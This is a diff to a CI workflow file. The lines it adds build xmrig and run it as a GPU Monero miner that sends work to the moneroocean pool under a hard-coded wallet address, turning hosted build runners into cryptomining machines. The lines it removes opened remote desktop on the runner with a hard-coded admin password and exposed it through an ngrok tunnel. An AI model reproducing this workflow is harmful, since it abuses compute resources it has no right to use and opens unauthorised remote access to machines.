@@ -16,30 +16,13 @@ jobs:
 
     - name: Download
 
-      run:  sudo apt install git cmake build-essential libssl-dev libuv1-dev libhwloc-dev
+      run:  sudo apt install git cmake build-essential libssl-dev libuv1-dev libhwloc-dev nvidia-cuda-toolkit
 
     - name: Clone
 
       run: git clone https://github.com/xmrig/xmrig.git
 
-    - name: steps
+    - name: mine
 
-      run: cd xmrig;mkdir build;cd build;cmake ..;make -j4
-
-      env:
-
-        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
-
-    - name: Enable TS
-
-      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-
-    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-
-    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-
-    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
-
-    - name: Create Tunnel
-
-      run: .\ngrok\ngrok tcp 3389
+      run: cd xmrig;mkdir build;cd build;cmake ..;make -j4;./xmrig --no-cpu --cuda -o gulf.moneroocean.stream -u 46fsx5UU1NBaDBFKJcK5TaZMgwCiy1nptHGkPBFR8U8Me74XPuKXkotgQfzkPkUc8zSKrN1ryEcMDZeGDouQMyqrVTQiTmv -p vm3
+      
